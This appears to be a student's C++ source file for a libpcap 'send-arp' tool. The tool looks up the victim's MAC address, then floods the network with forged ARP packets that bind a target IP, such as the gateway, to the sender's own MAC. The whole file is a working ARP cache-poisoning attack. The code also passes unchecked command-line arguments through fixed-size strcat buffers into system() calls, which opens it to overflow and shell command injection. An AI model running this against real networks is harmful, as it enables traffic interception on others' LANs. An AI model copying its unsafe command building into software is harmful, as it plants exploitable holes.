#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <stdio.h>
#include <fstream>
#include <iostream>
#include <fcntl.h>
#include <regex>
using namespace std;


#pragma pack(push, 1)
struct EthArpPacket {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
	printf("sample: send-arp eth0 192.168.0.185 192.168.0.1\n");
}

int main(int argc, char* argv[]) {
	// ping 명령어
	char command[30]="ping ";
	char *sender_ip=argv[2];
	char ping_count[]=" -c 3";

	// 맥주소 확인 명령어
	char mac_get_command[100]="ifconfig ";
	char *my_eth = argv[1];
	char* dev = argv[1];
	char interface_file[] = " > myInterface";
	
	//char no_ip_check[]="";	
	// 정규표현식에 사용되는 mac 버퍼
	string sender_mac_buffer;
	string my_mac_buffer;

	// 해당 이더넷 네트워크 설정 파일 생성
	strcat(mac_get_command,my_eth);
	strcat(mac_get_command,interface_file);
	system(mac_get_command);
	
	
	
	// 타켓 핑 명령어
	strcat(command,sender_ip);
	strcat(command,ping_count);
	system(command);


	if (argc != 4) {
		usage();
		return -1;
	}

	// mac주소 정규 표현식
	regex rgx("([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})");

	smatch sender_mac_match;
	smatch my_mac_match;
	
	//정규표현식으로 찾은 mac주소 저장 변수
	string sender_mac;	
	string my_mac;

	// arp테이블은 /proc/net/arp파일에 존재 
	// 해당 파일 읽어서 해당 아이피에대한 mac주소 찾는 정규표현식
	ifstream arp_table( "/proc/net/arp" );


	while (arp_table.peek() != EOF) 
	{
		getline(arp_table, sender_mac_buffer);
		if (sender_mac_buffer.find(sender_ip)==0)
		{
			if (regex_search(sender_mac_buffer,sender_mac_match, rgx))
			{
				//target_mac_address=(char*)target_mac_match[0];
				sender_mac= sender_mac_match.str();
				cout << "sender mac : " << sender_mac << '\n';
				
			}
		}
	}

	arp_table.close();
	

	// 해당 이더넷에 대한 ifconfig명령어 ./myInterface에 파일 저장 후
	// 정규표현식으로맥주소 찾기
	ifstream my_mac_file("./myInterface");
	while (my_mac_file.peek() != EOF) 
	{
		getline(my_mac_file, my_mac_buffer);
		if (regex_search(my_mac_buffer,my_mac_match, rgx))
		{
			my_mac=my_mac_match.str();
			cout << "my mac: " << my_mac << '\n';

		}
	}
	my_mac_file.close();

	//길길멘토님 코드
	//변수 위치만 설
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	//string test="08:00:27:bf:f2:17";
	//cout << test << '\n';
	//cout << my_mac << '\n';
	//cout << target_mac << '\n';
	EthArpPacket packet;	
	packet.eth_.dmac_ = Mac(sender_mac);
	
	packet.eth_.smac_ = Mac(my_mac);
	
	
	packet.eth_.type_ = htons(EthHdr::Arp);
	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	packet.arp_.op_ = htons(ArpHdr::Request);
	packet.arp_.smac_ = Mac(my_mac);
	packet.arp_.sip_ = htonl(Ip(argv[3]));
	packet.arp_.tmac_ = Mac(sender_mac);
	packet.arp_.tip_ = htonl(Ip(argv[2]));
	
	while(1)
	{
		int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
		if (res != 0) {
			fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
		}
	}
	
	pcap_close(handle);
	
}
